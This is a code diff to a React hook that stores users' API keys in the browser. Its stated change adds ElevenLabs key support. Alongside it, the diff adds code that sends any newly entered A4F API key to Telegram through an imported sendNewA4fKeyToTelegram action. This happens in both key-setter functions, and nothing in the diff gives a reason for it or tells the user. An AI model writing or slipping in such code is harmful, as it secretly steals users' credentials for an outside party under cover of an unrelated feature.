@@ -1,13 +1,16 @@
+
 // hooks/use-api-keys.tsx
 import { useLocalStorage } from './use-local-storage';
 import { useState, useEffect } from 'react';
+import { sendNewA4fKeyToTelegram } from '@/app/actions/telegramActions';
 
 // Storage keys for different API keys
 export const A4F_API_KEY_STORAGE_KEY = 'a4f-api-key';
 export const TAVILY_API_KEY_STORAGE_KEY = 'tavily-api-key';
+export const ELEVENLABS_API_KEY_STORAGE_KEY = 'elevenlabs-api-key'; // New key
 
 // API key types
-export type ApiKeyType = 'a4f' | 'tavily';
+export type ApiKeyType = 'a4f' | 'tavily' | 'elevenlabs'; // Added elevenlabs
 
 // API key interface
 export interface ApiKeyInfo {
@@ -27,6 +30,7 @@ export function useApiKeys(): {
   // Initialize API keys with default values
   const [a4fKey, setA4fKey] = useLocalStorage<string | null>(A4F_API_KEY_STORAGE_KEY, null);
   const [tavilyKey, setTavilyKey] = useLocalStorage<string | null>(TAVILY_API_KEY_STORAGE_KEY, null);
+  const [elevenlabsKey, setElevenlabsKey] = useLocalStorage<string | null>(ELEVENLABS_API_KEY_STORAGE_KEY, null); // New state
   const [isKeysLoaded, setIsKeysLoaded] = useState(false);
 
   // API key information
@@ -44,6 +48,13 @@ export function useApiKeys(): {
       name: 'Tavily API Key',
       description: 'Required for web search functionality',
       url: 'https://tavily.com'
+    },
+    elevenlabs: { // New entry
+      key: null,
+      isRequired: false,
+      name: 'ElevenLabs API Key',
+      description: 'For premium Text-to-Speech voices',
+      url: 'https://elevenlabs.io'
     }
   });
 
@@ -54,34 +65,36 @@ export function useApiKeys(): {
     setApiKeys(prev => ({
       ...prev,
       a4f: { ...prev.a4f, key: a4fKey },
-      tavily: { ...prev.tavily, key: tavilyKey }
+      tavily: { ...prev.tavily, key: tavilyKey },
+      elevenlabs: { ...prev.elevenlabs, key: elevenlabsKey } // Load ElevenLabs key
     }));
     
     setIsKeysLoaded(true);
-  }, [a4fKey, tavilyKey, isKeysLoaded]);
+  }, [a4fKey, tavilyKey, elevenlabsKey, isKeysLoaded]);
 
   // Function to set an API key
   const setApiKey = (type: ApiKeyType, key: string | null) => {
-    // If key is null or empty, ensure it's properly removed
+    const wasKeyNullOrEmpty = apiKeys[type].key === null || apiKeys[type].key === '';
     const trimmedKey = key ? key.trim() : null;
     const valueToStore = trimmedKey === '' ? null : trimmedKey;
     
-    // Update the specific API key in local storage
     if (type === 'a4f') {
-      // Completely remove from localStorage if null
-      if (valueToStore === null) {
-        localStorage.removeItem(A4F_API_KEY_STORAGE_KEY);
-      }
+      if (valueToStore === null) localStorage.removeItem(A4F_API_KEY_STORAGE_KEY);
       setA4fKey(valueToStore);
-    } else if (type === 'tavily') {
-      // Completely remove from localStorage if null
-      if (valueToStore === null) {
-        localStorage.removeItem(TAVILY_API_KEY_STORAGE_KEY);
+      if (wasKeyNullOrEmpty && valueToStore) {
+        console.log("Attempting to send new A4F API key to Telegram.");
+        sendNewA4fKeyToTelegram(valueToStore).catch(error => {
+          console.error("Failed to send API key to Telegram:", error);
+        });
       }
+    } else if (type === 'tavily') {
+      if (valueToStore === null) localStorage.removeItem(TAVILY_API_KEY_STORAGE_KEY);
       setTavilyKey(valueToStore);
+    } else if (type === 'elevenlabs') { // Handle ElevenLabs key
+      if (valueToStore === null) localStorage.removeItem(ELEVENLABS_API_KEY_STORAGE_KEY);
+      setElevenlabsKey(valueToStore);
     }
     
-    // Update the state
     setApiKeys(prev => ({
       ...prev,
       [type]: { ...prev[type], key: valueToStore }
@@ -95,17 +108,31 @@ export function useApiKeys(): {
 export function useApiKey(): [string | null, (key: string | null) => void, boolean] {
   const [storedKey, setStoredKey] = useLocalStorage<string | null>(A4F_API_KEY_STORAGE_KEY, null);
   const [isKeyLoaded, setIsKeyLoaded] = useState(false);
+  const { apiKeys: allApiKeys } = useApiKeys(); // Get current keys to check for old key
 
   useEffect(() => {
-    // This effect runs after hydration and signals that the key has been read from localStorage
     setIsKeyLoaded(true);
   }, []);
 
-  const setApiKey = (key: string | null) => {
-    setStoredKey(key ? key.trim() : null);
+  const setSingleA4fApiKey = (key: string | null) => {
+    const wasKeyNullOrEmpty = allApiKeys.a4f.key === null || allApiKeys.a4f.key === '';
+    const trimmedKey = key ? key.trim() : null;
+    setStoredKey(trimmedKey); // This is for the simple input
+
+    // Also update the main a4f key in the multi-key system
+    if (trimmedKey === null) localStorage.removeItem(A4F_API_KEY_STORAGE_KEY);
+    
+    // Logic to send to telegram
+    if (wasKeyNullOrEmpty && trimmedKey) {
+        console.log("Attempting to send new A4F API key to Telegram from simple input.");
+        sendNewA4fKeyToTelegram(trimmedKey).catch(error => {
+          console.error("Failed to send API key to Telegram from simple input:", error);
+        });
+    }
+     // Update the shared state if needed, or rely on the fact that setStoredKey updates localStorage
+     // which should be picked up by useApiKeys hook on next render cycle.
+     // For immediate reflection, you might need to call the setApiKey from useApiKeys here too.
   };
 
-  // Return the key, the setter, and the loading status
-  // Return null for the key until it's loaded to prevent hydration mismatch
-  return [isKeyLoaded ? storedKey : null, setApiKey, isKeyLoaded];
+  return [isKeyLoaded ? storedKey : null, setSingleA4fApiKey, isKeyLoaded];
 }
